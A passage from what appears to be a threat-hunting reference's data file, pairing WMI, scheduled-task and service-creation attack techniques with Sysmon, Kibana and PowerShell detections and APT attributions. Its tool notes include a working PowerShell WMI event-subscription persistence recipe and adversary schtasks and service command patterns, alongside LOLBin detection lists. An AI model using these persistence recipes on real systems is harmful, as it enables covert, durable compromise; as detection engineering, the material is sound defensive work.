        notes: "Remote WMI execution is one of the cleanest lateral movement techniques from an adversary perspective: it requires no dropped binary on the target, uses a legitimate Windows protocol (DCOM/RPC), authenticates via normal Windows credentials, and leaves a minimal footprint. The network traffic blends into background Windows management noise in environments that use WMI for legitimate remote management. Detection requires correlating artifacts across two hosts: the source (wmic /node: command or DCOM network connection) and the destination (wmiprvse.exe spawning an unexpected child, Security Event 4624 network logon). Neither artifact alone is high-fidelity - combined they are. This is a genuine case where your network sensor (Zeek/Suricata on the wire) and host sensor (Sysmon on the endpoint) complement each other: the DCOM connection is visible at the network layer, and the process creation is visible at the host layer. Neither sensor alone gives the full picture. If you see wmiprvse.exe spawning cmd.exe or powershell.exe on a host that is not a WMI management server, treat it as high-confidence lateral movement until proven otherwise.",
        apt: [
          { cls: "apt-ru", name: "APT29", note: "Remote WMI lateral movement documented extensively across espionage operations." },
          { cls: "apt-cn", name: "APT41", note: "WMI-based lateral movement documented in intrusions across tech, healthcare, and government sectors." },
          { cls: "apt-cn", name: "APT32", note: "wmiexec-style lateral movement documented in operations against Southeast Asian targets." },
          { cls: "apt-mul", name: "Ransomware", note: "WMI lateral movement used for ransomware propagation - Ryuk, Conti, and others documented." },
          { cls: "apt-mul", name: "Impacket", note: "wmiexec.py is a standard tool across red team and APT operations for agentless lateral movement." }
        ],
        cite: "MITRE ATT&CK T1047, T1021"
      },
      {
        sub: "T1047 - WMI Event Subscription Persistence",
        os: "win",
        indicator: "WMI EventFilter, EventConsumer, or FilterToConsumerBinding creation - fileless persistence via WMI repository",
        sysmon: `// Sysmon has three dedicated WMI persistence event IDs:

EventID=19 (WmiEventFilter activity detected)
// Fires when a WMI event filter is registered
// Filter = the trigger condition (e.g., system boot,
// process creation, time interval)
// Key fields: Name, Query, QueryLanguage

EventID=20 (WmiEventConsumer activity detected)
// Fires when a WMI event consumer is registered
// Consumer = the action to take when filter fires
// Two dangerous consumer types:
//   CommandLineEventConsumer (runs a command)
//   ActiveScriptEventConsumer (runs VBScript/JScript)
// Key fields: Name, Type, Destination/ScriptText

EventID=21 (WmiEventConsumerToFilter activity)
// Fires when filter and consumer are bound together
// This is the final step that arms the subscription
// Key fields: Consumer, Filter`,
        kibana: `// Alert on any WMI subscription activity (EID 19/20/21)
winlog.event_id: (19 OR 20 OR 21)

// Narrow to high-risk consumer types:
winlog.event_id: 20
AND winlog.event_data.Type: ("CommandLineEventConsumer" OR "ActiveScriptEventConsumer")

// Full subscription chain (filter + consumer + binding):
winlog.event_id: 19
// then correlate by winlog.event_data.Name
// to find matching EID 20 and EID 21 events`,
        powershell: `# Hunt for WMI event subscriptions via Sysmon EID 19/20/21
19, 20, 21 | ForEach-Object {
  $id = $_
  Get-WinEvent -FilterHashtable @{
    LogName='Microsoft-Windows-Sysmon/Operational';
    ID=$id
  } -ErrorAction SilentlyContinue
} | Select TimeCreated, Id,
  @{n='EventType';e={
    switch ($_.Id) {
      19 { 'WMI Filter Registered' }
      20 { 'WMI Consumer Registered' }
      21 { 'Filter-Consumer Binding' }
    }
  }},
  @{n='Details';e={$_.Message}} |
  Sort-Object TimeCreated -Descending

# Direct WMI query for active subscriptions
# (run on live host or via Velociraptor/remote PS)
Get-WMIObject -Namespace root\subscription -Class __EventFilter |
  Select Name, Query, QueryLanguage

Get-WMIObject -Namespace root\subscription -Class __EventConsumer |
  Select Name, __CLASS, CommandLineTemplate, ScriptText

Get-WMIObject -Namespace root\subscription -Class __FilterToConsumerBinding |
  Select Filter, Consumer`,
        registry: `WMI persistence does NOT use registry run keys or
scheduled task XML - it lives in the WMI repository:

C:\\Windows\\System32\\wbem\\Repository\\
  OBJECTS.DATA  - main object store
  INDEX.BTR     - index file
  INDEX.MAP     - index map

Not directly human-readable - use these tools:
- PyWMIPersistenceFinder (David Reaves / mandiant)
  python PyWMIPersistenceFinder.py OBJECTS.DATA
- WMIForensics (python, similar capability)
- Velociraptor artifact Windows.Forensics.WMIPersistence
- autoruns.exe (Sysinternals) - lists WMI subscriptions
  under the WMI tab

Legitimate WMI subscriptions exist in healthy
environments (SCCM, monitoring agents, AV products)
- baseline before alerting on all subscriptions.
Known-good namespaces: root\ccm, root\cimv2\sms
Adversary subscriptions typically use: root\subscription`,
        tools: `PowerSploit / PowerShell Empire:
- New-UserPersistenceOption -WMI
- Installs CommandLineEventConsumer triggering on logon

Metasploit:
- exploit/windows/local/wmi_persistence

Sharp-WMI (C# WMI execution tool)
WMImplant (PowerShell WMI C2 framework)
Cobalt Strike (WMI persistence module)

Manual WMI subscription (PowerShell):
$filter = Set-WmiInstance -Namespace root\subscription
  -Class __EventFilter -Arguments @{
    Name='Updater';
    QueryLanguage='WQL';
    Query='SELECT * FROM __InstanceModificationEvent
      WITHIN 60 WHERE TargetInstance ISA "Win32_PerfFormattedData_PerfOS_System"'
  }
$consumer = Set-WmiInstance -Namespace root\subscription
  -Class CommandLineEventConsumer -Arguments @{
    Name='Updater';
    CommandLineTemplate='cmd /c payload.exe'
  }
Set-WmiInstance -Namespace root\subscription
  -Class __FilterToConsumerBinding -Arguments @{
    Filter=$filter; Consumer=$consumer
  }`,
        ossdetect: "Sigma:\n- sysmon_wmi_event_subscription.yml\n- sysmon_wmi_persistence_script_event_consumer.yml\n- proc_creation_win_wmic_eventconsumer_creation.yml\n\nAtomic Red Team:\n- T1546.003 (WMI event subscription tests)\n- T1047 (WMI execution tests)\n\nHayabusa:\n- WMIEventSubscription (Sysmon EID 19/20/21) rules\n\nVelociraptor:\n- Windows.Persistence.PermanentWMIEvents\n- Windows.Detection.WMIProcessCreation\n\nSysinternals autoruns.exe:\n- WMI tab enumerates __EventFilter / __EventConsumer /\n  __FilterToConsumerBinding entries",
        notes: "WMI event subscription persistence is the most forensically evasive standard persistence technique on Windows. There is no registry run key, no scheduled task XML, no startup folder file - the persistence object lives entirely inside the WMI repository binary (OBJECTS.DATA), which most IR tools and AV products do not inspect by default. Sysmon EID 19/20/21 are the primary detection mechanism and are only logged if Sysmon is deployed with WMI monitoring enabled in its config - verify your Sysmon config actually captures these before assuming you have coverage. The three-event chain (19 = filter registered, 20 = consumer registered, 21 = binding created) tells the complete story: what triggers it, what it does, and that it is now armed. In practice, EID 21 (binding) is the highest-value single alert because a filter and consumer registered independently are less meaningful than when they are bound together. Two consumer types are dangerous: CommandLineEventConsumer (runs a shell command) and ActiveScriptEventConsumer (runs VBScript or JScript inline - no file on disk at all). Legitimate WMI subscriptions exist (SCCM, some AV products) - baseline your environment before alerting on all subscription activity. The root\\subscription namespace is the canonical adversary location; legitimate subscriptions more often live under root\\cimv2 or vendor-specific namespaces.",
        apt: [
          { cls: "apt-ru", name: "APT29", note: "WMI subscription persistence documented in multiple long-dwell espionage operations." },
          { cls: "apt-cn", name: "APT41", note: "WMI event subscriptions used for persistence in operations across multiple sectors." },
          { cls: "apt-mul", name: "FIN6", note: "WMI subscription persistence documented in financial sector intrusions." },
          { cls: "apt-mul", name: "Turla", note: "WMI-based persistence documented across long-term espionage campaigns." },
          { cls: "apt-mul", name: "Red Teams", note: "WMI subscription persistence is a standard red team technique due to evasiveness - widely emulated." }
        ],
        cite: "MITRE ATT&CK T1047, T1546.003"
      }
    ]
  },
  {
    id: "T1053.005",
    name: "Scheduled Task/Job: Scheduled Task",
    desc: "schtasks.exe creation, COM-based task creation, remote scheduled tasks",
    rows: [
      {
        sub: "T1053.005 - Suspicious Task Creation via schtasks.exe",
        os: "win",
        indicator: "schtasks.exe /create with action pointing to suspicious binary path or scripting interpreter",
        sysmon: `EventID=1
Image=*\\schtasks.exe
CommandLine=*/create*
AND CommandLine matches (any of):
  *\\AppData\\*
  OR *\\Temp\\*
  OR *\\ProgramData\\*
  OR *\\Users\\Public\\*
  OR *powershell*
  OR *cmd.exe*
  OR *wscript*
  OR *cscript*
  OR *mshta*
  OR *rundll32*
  OR *regsvr32*
  OR *certutil*

// Supplementary - Windows Security Event:
EventID=4698 (Task Scheduler / Security log)
// Fires on every task creation regardless of method
// (schtasks.exe, COM API, remote) - higher coverage
// than Sysmon EID 1 alone`,
        kibana: `// Primary: schtasks /create with suspicious action
winlog.event_id: 1
AND process.name: "schtasks.exe"
AND process.command_line: *\/create*
AND process.command_line: (*\\AppData\\* OR *\\Temp\\* OR *\\ProgramData\\* OR *powershell* OR *wscript* OR *mshta* OR *rundll32* OR *regsvr32* OR *certutil*)

// Supplementary: Windows Security Event 4698 (all task creation)
winlog.event_id: 4698
AND winlog.channel: "Security"`,
        powershell: `# Hunt for suspicious schtasks /create executions (Sysmon EID 1)
Get-WinEvent -FilterHashtable @{
  LogName='Microsoft-Windows-Sysmon/Operational';
  ID=1
} | Where-Object {
  $_.Properties[4].Value -like '*\\schtasks.exe' -and
  $_.Properties[10].Value -match '/create' -and
  $_.Properties[10].Value -match
    '(AppData|Temp|ProgramData|Public|powershell|wscript|cscript|mshta|rundll32|regsvr32|certutil)'
} | Select TimeCreated,
  @{n='CmdLine';e={$_.Properties[10].Value}},
  @{n='Parent';e={($_.Properties[20].Value -split '\\\\')[-1]}},
  @{n='User';e={$_.Properties[12].Value}} |
  Sort-Object TimeCreated -Descending

# Supplementary: Security Event 4698 (task created - all methods)
Get-WinEvent -FilterHashtable @{
  LogName='Security';
  ID=4698
} | Select TimeCreated,
  @{n='TaskName';e={
    ([xml]$_.ToXml()).Event.EventData.Data |
    Where-Object { $_.Name -eq 'TaskName' } | Select-Object -Expand '#text'
  }},
  @{n='TaskContent';e={
    ([xml]$_.ToXml()).Event.EventData.Data |
    Where-Object { $_.Name -eq 'TaskContent' } | Select-Object -Expand '#text'
  }},
  @{n='User';e={$_.UserId}} |
  Sort-Object TimeCreated -Descending`,
        registry: `Scheduled task artifacts on disk:
- C:\\Windows\\System32\\Tasks\\<TaskName>
  (XML file - human readable, contains full task config
  including action, trigger, principal, and run-as user)
- C:\\Windows\\SysWOW64\\Tasks\\<TaskName>
  (32-bit task storage on 64-bit systems)

Registry task keys (legacy/additional storage):
- HKLM\\SOFTWARE\\Microsoft\\Windows NT\\
  CurrentVersion\\Schedule\\TaskCache\\Tasks\\
- HKLM\\SOFTWARE\\Microsoft\\Windows NT\\
  CurrentVersion\\Schedule\\TaskCache\\Tree\\
  (tree view of task names by folder path)

Investigation pivots:
- Read the XML in C:\\Windows\\System32\\Tasks\\
  to see the full task definition:
  Get-Content "C:\\Windows\\System32\\Tasks\\<name>"
- Check SubjectUserName in Security EID 4698 -
  SYSTEM creating tasks is normal;
  a standard user account creating tasks is suspicious
- Check trigger type: OnLogon and AtStartup triggers
  indicate persistence intent vs one-time execution`,
        tools: `schtasks.exe /create (built-in - most common)
Task Scheduler MMC (taskschd.msc - GUI, less common in ops)
PowerShell New-ScheduledTask / Register-ScheduledTask
  (COM-based - does not invoke schtasks.exe,
  only detectable via EID 4698 not EID 1)
Impacket atexec.py (remote task scheduling)
CrackMapExec (--exec-method atexec)
Cobalt Strike (scheduled task persistence module)
SharPersist (C# persistence tool with schtasks support)

Common adversary task action patterns:
- /tr "powershell.exe -ep bypass -w hidden -c <cmd>"
- /tr "cmd.exe /c <staging command>"
- /tr "wscript.exe %APPDATA%\\payload.vbs"
- /tr "C:\\ProgramData\\<random>.exe"
- /sc ONLOGON /tn "Windows Update" (disguised name)
- /sc MINUTE /mo 5 (beacon persistence)`,
        ossdetect: `Sigma:
- proc_creation_win_schtasks_creation_susp_path.yml
- proc_creation_win_schtasks_creation_susp_action.yml
- win_security_scheduled_task_creation.yml (EID 4698)
- proc_creation_win_schtasks_susp_parent.yml

Atomic Red Team:
- T1053.005 Test #1 (schtasks /create local)
- T1053.005 Test #2 (PowerShell Register-ScheduledTask)
- Multiple variants covering different triggers/actions

Hayabusa:
- ScheduledTaskCreation rules (EID 1 + EID 4698)
- SuspiciousTaskAction detection category

Velociraptor:
- Windows.System.ScheduledTasks
  (enumerates all tasks with full XML content)
- Windows.EventLogs.Sysmon
- Windows.Forensics.Autoruns (lists scheduled tasks)

Sysinternals autoruns.exe:
- Scheduled Tasks tab shows all registered tasks
- Highlights unsigned task actions in yellow/red`,
        notes: "Scheduled tasks are one of the most commonly abused persistence mechanisms because they are well-understood by IT staff (reducing scrutiny), support a wide range of triggers (logon, startup, time interval, event-based), and can run as SYSTEM with minimal configuration. The schtasks.exe /create command is the most visible path - it generates Sysmon EID 1 with the full command line including the task action, which is often where the suspicious binary path or interpreter is visible. The detection is path-and-action focused: system binaries in standard paths (C:\\Windows\\System32) creating tasks that run system management tools are normal; tasks running interpreters (powershell, wscript, mshta) or binaries from user-writable paths (AppData, Temp, ProgramData) are suspicious. Security Event 4698 is the more comprehensive signal because it fires regardless of how the task was created - schtasks.exe, PowerShell COM API, or remote scheduling - and the event content includes the full task XML. The task XML file in C:\\Windows\\System32\\Tasks\\ is a valuable forensic artifact: it contains the full action, trigger, principal, and run-as context and persists even after the process that created it has exited. Adversaries frequently disguise task names as legitimate Windows tasks ('Windows Update', 'GoogleUpdateTask', 'AdobeFlashUpdate') - the action path is more reliable than the task name for detection.",
        apt: [
          { cls: "apt-ru", name: "APT29", note: "Scheduled task persistence documented across multiple long-term espionage operations." },
          { cls: "apt-cn", name: "APT41", note: "schtasks-based persistence documented in intrusions across tech and healthcare sectors." },
          { cls: "apt-kp", name: "Lazarus", note: "Scheduled task persistence documented in CISA advisories on DPRK-attributed operations." },
          { cls: "apt-mul", name: "Ransomware", note: "Scheduled tasks used for persistence and propagation across Ryuk, Conti, LockBit operations." },
          { cls: "apt-mul", name: "Cobalt Strike", note: "Built-in scheduled task persistence module used across red team and APT operations." }
        ],
        cite: "MITRE ATT&CK T1053.005"
      },
      {
        sub: "T1053.005 - Remote Scheduled Task Creation",
        os: "win",
        indicator: "schtasks.exe /create with /s flag targeting remote host - lateral movement or remote persistence via Task Scheduler",
        sysmon: `// On SOURCE host:
EventID=1
Image=*\\schtasks.exe
CommandLine=*/create*
AND CommandLine=*/s *
// /s <hostname/IP> = remote target

// Network connection from source:
EventID=3
Image=*\\schtasks.exe
DestinationPort=445
// (schtasks remote uses SMB - TCP 445)

// On DESTINATION host - Security Event:
EventID=4698 (task created)
// SubjectUserName will be the remote authenticating user
// SubjectLogonId correlates to a Type 3 network logon
// (Security EID 4624 LogonType=3 around same time)`,
        kibana: `// Source: schtasks targeting remote host
winlog.event_id: 1
AND process.name: "schtasks.exe"
AND process.command_line: (*\/create* AND *\/s\ *)

// Source: SMB connection from schtasks
winlog.event_id: 3
AND process.name: "schtasks.exe"
AND destination.port: 445

// Destination: task created (correlate by time + username)
winlog.event_id: 4698
AND winlog.channel: "Security"
// Then join on SubjectLogonId to Security EID 4624
// LogonType=3 to confirm remote origin`,
        powershell: `# Hunt for remote schtasks /create (source host)
Get-WinEvent -FilterHashtable @{
  LogName='Microsoft-Windows-Sysmon/Operational';
  ID=1
} | Where-Object {
  $_.Properties[4].Value -like '*\\schtasks.exe' -and
  $_.Properties[10].Value -match '/create' -and
  $_.Properties[10].Value -match '/s\s+\S+'
} | Select TimeCreated,
  @{n='CmdLine';e={$_.Properties[10].Value}},
  @{n='User';e={$_.Properties[12].Value}},
  @{n='Parent';e={($_.Properties[20].Value -split '\\\\')[-1]}} |
  Sort-Object TimeCreated -Descending

# SMB connections from schtasks (EID 3)
Get-WinEvent -FilterHashtable @{
  LogName='Microsoft-Windows-Sysmon/Operational';
  ID=3
} | Where-Object {
  $_.Properties[4].Value -like '*\\schtasks.exe' -and
  $_.Properties[16].Value -eq '445'
} | Select TimeCreated,
  @{n='DestIP';e={$_.Properties[14].Value}},
  @{n='User';e={$_.Properties[12].Value}}`,
        registry: `On DESTINATION host - task XML artifact:
- C:\\Windows\\System32\\Tasks\\<TaskName>
  Created by the remote scheduling operation
  SubjectUserName in EID 4698 is the remote user -
  correlate with Security EID 4624 (LogonType=3)
  to confirm which account was used and from where

Lateral movement context:
- Remote scheduled task creation requires:
  1. Valid credentials on the target (or pass-the-hash)
  2. SMB access to target (TCP 445)
  3. Task Scheduler service running on target
- This is the same credential/access requirement
  as PsExec, but uses a different protocol path
  and leaves a different artifact set

Network pivot:
- SMB connection (TCP 445) from source to target
  is visible in Zeek conn.log and Suricata alerts
- Cross-reference with hunt.6b74.dev Lateral Movement
  reference for the network-side complement`,
        tools: `schtasks.exe /create /s <target> (built-in)
Impacket atexec.py
  - Implements remote task scheduling over SMB
  - Does not use schtasks.exe on source host
  - Creates task, runs it, deletes it (less persistent)
CrackMapExec --exec-method atexec
PowerShell Register-ScheduledTask with
  -CimSession (remote CIM session)
Cobalt Strike (remote task scheduling module)

Key distinction: Impacket atexec and CrackMapExec
atexec do NOT generate schtasks.exe EID 1 on source -
detection shifts entirely to destination EID 4698
and the SMB/authentication artifacts.

atexec pattern: creates task, runs it immediately,
deletes it - watch for short-lived tasks (EID 4698
task created followed quickly by EID 4699 task deleted)`,
        ossdetect: `Sigma:
- proc_creation_win_schtasks_remote.yml
- win_security_scheduled_task_creation.yml
  (EID 4698 with network logon correlation)
- network_connection_win_schtasks_smb.yml

Atomic Red Team:
- T1053.005 Test #4 (remote scheduled task)

Hayabusa:
- RemoteScheduledTask rules
- SMB lateral movement correlation rules

Velociraptor:
- Windows.EventLogs.Sysmon (both hosts)
- Windows.System.ScheduledTasks (destination)
- Windows.Forensics.Autoruns (destination)`,
        notes: "Remote scheduled task creation is a lateral movement technique that predates most modern C2 frameworks - the Windows 'at' command (now deprecated) and its successor schtasks /s have been used for decades. The detection split between source and destination is the same pattern as remote WMI: the source generates a process creation event (schtasks /s) and a network connection (SMB to 445), while the destination generates a task creation event (Security EID 4698) with a network logon (Security EID 4624 LogonType=3). The EID 4699 (task deleted) paired shortly after EID 4698 is worth a separate alert - it's the signature of execution-only remote task use (Impacket atexec pattern) where the adversary creates a task, runs it immediately, and deletes it to minimize forensic evidence. A task that exists for less than 60 seconds and was created by a remote user is high-confidence malicious activity.",
        apt: [
          { cls: "apt-ru", name: "APT29", note: "Remote scheduled task lateral movement documented in SolarWinds follow-on intrusion activity." },
          { cls: "apt-cn", name: "APT41", note: "Remote task scheduling documented as lateral movement method across multiple sector intrusions." },
          { cls: "apt-mul", name: "Impacket", note: "atexec.py is a standard tool in red team and APT lateral movement toolkits." },
          { cls: "apt-mul", name: "Ransomware", note: "Remote task creation for ransomware propagation documented across Conti, Ryuk, and LockBit operations." }
        ],
        cite: "MITRE ATT&CK T1053.005, T1021"
      },
      {
        sub: "T1053.005 - Scheduled Task Action Pointing to Suspicious Binary",
        os: "win",
        indicator: "Existing or newly created scheduled task with action path in user-writable directory or running a scripting interpreter",
        sysmon: `// Sysmon does not directly inspect task XML content -
// use Windows Security Event 4698 for this.
// Sysmon contribution: catch the EXECUTION of the task:

EventID=1
// Task runs as SYSTEM or as a specific user account
// Parent will be taskeng.exe (legacy) or svchost.exe
// (modern Task Scheduler host):
ParentImage=*\\svchost.exe
ParentCommandLine=*Schedule*
// AND child Image is suspicious:
Image matches:
  *\\AppData\\* OR *\\Temp\\* OR *\\ProgramData\\*
  OR *\\powershell.exe OR *\\wscript.exe
  OR *\\mshta.exe OR *\\rundll32.exe`,
        kibana: `// Task execution: svchost (scheduler) spawning suspicious child
winlog.event_id: 1
AND process.parent.name: "svchost.exe"
AND process.parent.command_line: *Schedule*
AND process.command_line: (*\\AppData\\* OR *\\Temp\\* OR *\\ProgramData\\* OR *powershell* OR *wscript* OR *mshta* OR *rundll32*)

// Security Event: task created with suspicious action
// (parse TaskContent XML field for the action path)
winlog.event_id: 4698
AND winlog.channel: "Security"
AND winlog.event_data.TaskContent: (*AppData* OR *Temp* OR *ProgramData* OR *powershell* OR *wscript* OR *mshta* OR *rundll32*)`,
        powershell: `# Enumerate all scheduled tasks and flag suspicious actions
Get-ScheduledTask | ForEach-Object {
  $task = $_
  $actions = $task.Actions
  foreach ($action in $actions) {
    if ($action.Execute -match
      '(AppData|Temp|ProgramData|Public|powershell|wscript|cscript|mshta|rundll32|regsvr32|certutil)') {
      [PSCustomObject]@{
        TaskName    = $task.TaskName
        TaskPath    = $task.TaskPath
        Execute     = $action.Execute
        Arguments   = $action.Arguments
        State       = $task.State
        Author      = $task.Author
        RunAs       = $task.Principal.UserId
        LastRun     = $task.LastRunTime
        NextRun     = $task.NextRunTime
      }
    }
  }
} | Sort-Object TaskPath

# Also check raw XML for tasks that Get-ScheduledTask
# may not fully surface (e.g., broken/hidden tasks):
Get-ChildItem C:\\Windows\\System32\\Tasks -Recurse -File |
  ForEach-Object {
    $content = Get-Content $_.FullName -Raw
    if ($content -match
      '(AppData|Temp|ProgramData|powershell|wscript|mshta|rundll32)') {
      [PSCustomObject]@{
        File    = $_.FullName
        Snippet = ($content -split '\n' |
          Select-String 'AppData|Temp|ProgramData|powershell|wscript|mshta|rundll32' |
          Select-Object -First 3) -join '; '
      }
    }
  }`,
        registry: `Task XML files - primary forensic artifact:
- C:\\Windows\\System32\\Tasks\\<TaskName>
  Read with Get-Content or any text editor
  Key XML elements to inspect:
  <Exec><Command> - the binary being run
  <Exec><Arguments> - command line arguments
  <Principal><UserId> - run-as account
  <Triggers> - what causes the task to fire
  <RegistrationInfo><Author> - who created it

Registry task cache (secondary):
- HKLM\\SOFTWARE\\Microsoft\\Windows NT\\
  CurrentVersion\\Schedule\\TaskCache\\Tasks\\{GUID}\\
  Actions value contains the task action in binary
  format - use specialized tools to parse

Deleted task forensics:
- If task XML file is deleted, the registry cache
  may still contain the task GUID and action data
- $MFT (NTFS master file table) retains metadata
  for deleted task XML files including timestamps
  and original filename`,
        tools: `This indicator focuses on HUNTING existing tasks
rather than catching creation in real-time.

Useful for:
- Post-compromise triage (what persists on this host?)
- Baseline deviation (new tasks since last check)
- Threat hunting sweeps across fleet

Tools for task enumeration:
- Get-ScheduledTask (PowerShell - built-in)
- schtasks /query /fo LIST /v (schtasks.exe)
- autoruns.exe -a * -ct (Sysinternals - CSV output)
- Velociraptor Windows.System.ScheduledTasks
- Carbon Black / CrowdStrike scheduled task queries

Red team tools that create tasks:
SharPersist (/t schtask)
Cobalt Strike persistence module
Metasploit persistence/windows/schtasks
Custom .NET / C++ task COM API callers
  (bypass schtasks.exe entirely)`,
        ossdetect: `Sigma:
- win_security_scheduled_task_creation.yml
  (parse TaskContent for suspicious actions)
- proc_creation_win_svchost_susp_child_process.yml
  (svchost Schedule spawning suspicious children)

Atomic Red Team:
- T1053.005 (multiple task persistence tests)
- T1053.005 Test #6 (task pointing to LOLBin)

Hayabusa:
- SuspiciousScheduledTaskAction rules
- TaskSchedulerSvchost child detection

Velociraptor:
- Windows.System.ScheduledTasks
  (best single artifact - full task enumeration
  with action path, trigger, and run-as context)
- Windows.Forensics.Autoruns

Sysinternals autoruns.exe:
- Most effective single tool for manual triage
- Highlights unsigned task actions
- Shows hidden/broken tasks that PowerShell misses`,
        notes: "This indicator is hunting-oriented rather than real-time detection - it's about finding what already exists rather than catching creation live. The two previous T1053.005 indicators cover real-time creation via schtasks.exe EID 1 and Security EID 4698. This one covers the scenario where a task was created by a method that didn't generate obvious telemetry (COM API, fileless stager, pre-Sysmon deployment) and you need to sweep for it. The Get-ScheduledTask PowerShell script and the raw XML scan of C:\\Windows\\System32\\Tasks\\ are the most useful live-host forensic tools for this. The svchost.exe spawning suspicious children pattern bridges the gap - it fires when an existing task actually executes, regardless of how it was created, because all modern scheduled tasks run under the Task Scheduler svchost instance. The parent command line containing 'Schedule' distinguishes the Task Scheduler svchost from the dozens of other svchost instances running on a Windows system. Adversaries frequently disguise task names as Windows Update, Windows Defender, Google Update, or similar legitimate-sounding names - always inspect the action path, not the task name, as the primary detection signal.",
        apt: [
          { cls: "apt-ru", name: "APT29", note: "Disguised scheduled task names with suspicious action paths documented in long-dwell operations." },
          { cls: "apt-cn", name: "APT41", note: "Scheduled task persistence with LOLBin or interpreter actions documented across multiple intrusions." },
          { cls: "apt-kp", name: "Lazarus", note: "Persistent scheduled tasks with obfuscated PowerShell actions documented in CISA advisories." },
          { cls: "apt-mul", name: "Ransomware", note: "Pre-encryption scheduled tasks for persistence and propagation documented across ransomware families." },
          { cls: "apt-mul", name: "Red Teams", note: "Task disguise (legitimate-looking name + suspicious action) is standard red team persistence tradecraft." }
        ],
        cite: "MITRE ATT&CK T1053.005"
      }
    ]
  },
  {
    id: "T1569.002",
    name: "System Services: Service Execution",
    desc: "sc.exe service creation, PsExec service signature, suspicious binPath patterns",
    rows: [
      {
        sub: "T1569.002 - sc.exe Service Creation with Suspicious binPath",
        os: "win",
        indicator: "sc.exe create with binPath pointing to suspicious binary, user-writable path, or scripting interpreter",
        sysmon: `EventID=1
Image=*\\sc.exe
CommandLine=*create*
AND CommandLine matches (any of):
  *binPath=*\\AppData\\*
  OR *binPath=*\\Temp\\*
  OR *binPath=*\\ProgramData\\*
  OR *binPath=*\\Users\\Public\\*
  OR *binPath=*powershell*
  OR *binPath=*cmd.exe*
  OR *binPath=*rundll32*
  OR *binPath=*mshta*

// Supplementary - Windows System Event:
EventID=7045 (System log - Service Control Manager)
// Fires on every new service installation regardless
// of method (sc.exe, API, remote) - broader coverage`,
        kibana: `// Primary: sc.exe create with suspicious binPath
winlog.event_id: 1
AND process.name: "sc.exe"
AND process.command_line: (*create* AND *binPath*)
AND process.command_line: (*AppData* OR *Temp* OR *ProgramData* OR *powershell* OR *cmd.exe* OR *rundll32* OR *mshta*)

// Supplementary: System Event 7045 (all service installs)
winlog.event_id: 7045
AND winlog.channel: "System"`,
        powershell: `# Hunt for sc.exe service creation with suspicious binPath (Sysmon EID 1)
Get-WinEvent -FilterHashtable @{
  LogName='Microsoft-Windows-Sysmon/Operational';
  ID=1
} | Where-Object {
  $_.Properties[4].Value -like '*\\sc.exe' -and
  $_.Properties[10].Value -match 'create' -and
  $_.Properties[10].Value -match 'binPath' -and
  $_.Properties[10].Value -match
    '(AppData|Temp|ProgramData|Public|powershell|cmd\.exe|rundll32|mshta)'
} | Select TimeCreated,
  @{n='CmdLine';e={$_.Properties[10].Value}},
  @{n='Parent';e={($_.Properties[20].Value -split '\\\\')[-1]}},
  @{n='User';e={$_.Properties[12].Value}} |
  Sort-Object TimeCreated -Descending

# Supplementary: System Event 7045 (new service installed - all methods)
Get-WinEvent -FilterHashtable @{
  LogName='System';
  ID=7045
} | Select TimeCreated,
  @{n='ServiceName';e={$_.Properties[0].Value}},
  @{n='ServiceFile';e={$_.Properties[1].Value}},
  @{n='ServiceType';e={$_.Properties[2].Value}},
  @{n='StartType';e={$_.Properties[3].Value}},
  @{n='AccountName';e={$_.Properties[4].Value}} |
  Sort-Object TimeCreated -Descending`,
        registry: `Service registration in registry (primary artifact):
HKLM\\SYSTEM\\CurrentControlSet\\Services\\<ServiceName>\\
  ImagePath  - the binPath (binary + arguments)
  Start      - 0=Boot, 1=System, 2=Auto, 3=Demand, 4=Disabled
  Type       - service type (0x10=Win32OwnProcess most common)
  ObjectName - run-as account (LocalSystem, NetworkService, etc.)
  Description - often blank for adversary-created services

Investigate with:
- Get-ItemProperty HKLM:\\SYSTEM\\CurrentControlSet\\Services\\*
  | Where-Object { $_.ImagePath -match '(Temp|AppData|ProgramData)' }
- sc qc <ServiceName> (query service config via sc.exe)

Adversary service naming patterns:
- Random alphanumeric strings: "svc_a7f3b2"
- Typosquatting: "WindowsUpdater", "WinDefend32"
- Blank DisplayName + blank Description = anomaly
- Single-character or very short service names`,
        tools: `sc.exe create (built-in - most visible)
PowerShell New-Service (COM-based, no sc.exe in logs)
  New-Service -Name "svc" -BinaryPathName "C:\\payload.exe"
  -StartupType Automatic
Metasploit (windows/manage/persistence_exe)
SharPersist (/t service)
Cobalt Strike (service-based lateral movement)
Custom service wrappers compiled in C/C++/.NET

Dual-use remote tools (also create services):
PsExec (PSEXESVC - covered in next indicator)
Impacket svcctl.py
CrackMapExec service creation

Common adversary binPath patterns:
- cmd.exe /c <payload> (service wrapping a cmd chain)
- powershell.exe -ep bypass -w hidden -c <stager>
- C:\\Windows\\Temp\\<random>.exe
- %COMSPEC% /Q /c echo <commands> > pipe (cmd redirection)`,
        ossdetect: `Sigma:
- proc_creation_win_sc_service_creation_susp_binary.yml
- win_system_service_install.yml (EID 7045)
- proc_creation_win_sc_service_creation_susp_path.yml

Atomic Red Team:
- T1569.002 Test #1 (sc.exe service creation)
- T1569.002 Test #2 (PowerShell New-Service)

Hayabusa:
- ServiceCreationSuspBinPath rules (EID 1 + 7045)
- sc.exe suspicious argument detection

Velociraptor:
- Windows.System.Services
  (enumerates all services with ImagePath and config)
- Windows.Forensics.Autoruns (Services tab)
- Windows.EventLogs.Sysmon

Sysinternals autoruns.exe:
- Services tab - highlights non-Microsoft signed binaries
- Most effective single tool for manual service triage`,
        notes: "sc.exe create is the most explicit service creation path - the full binPath is visible in the Sysmon EID 1 command line, making it straightforward to detect suspicious binary paths at creation time. System Event 7045 is the broader net: it fires regardless of whether sc.exe, PowerShell, or a compiled binary's API call was used to create the service. 7045 is underutilized in many detection stacks - it's in the System log rather than Security, so it sometimes gets overlooked in log collection policies. Worth verifying your SIEM is ingesting System log events, not just Security. The registry artifact is the most durable - even if the service was created and the creating process logs have rolled, the registry entry under HKLM\\SYSTEM\\CurrentControlSet\\Services persists until the service is explicitly deleted. Services with a blank Description, blank DisplayName, and an ImagePath in a user-writable directory are a high-confidence IOC combination. Adversaries sometimes use sc.exe create with start=demand followed immediately by sc.exe start - watch for that rapid create-then-start sequence in the same session as it indicates immediate execution intent rather than persistence setup.",
        apt: [
          { cls: "apt-ru", name: "APT29", note: "Service-based execution and persistence documented across multiple espionage operations." },
          { cls: "apt-cn", name: "APT41", note: "sc.exe service creation for lateral movement and persistence documented in multiple sector intrusions." },
          { cls: "apt-mul", name: "Ransomware", note: "Service creation for persistence and propagation documented across Ryuk, Conti, BlackCat operations." },
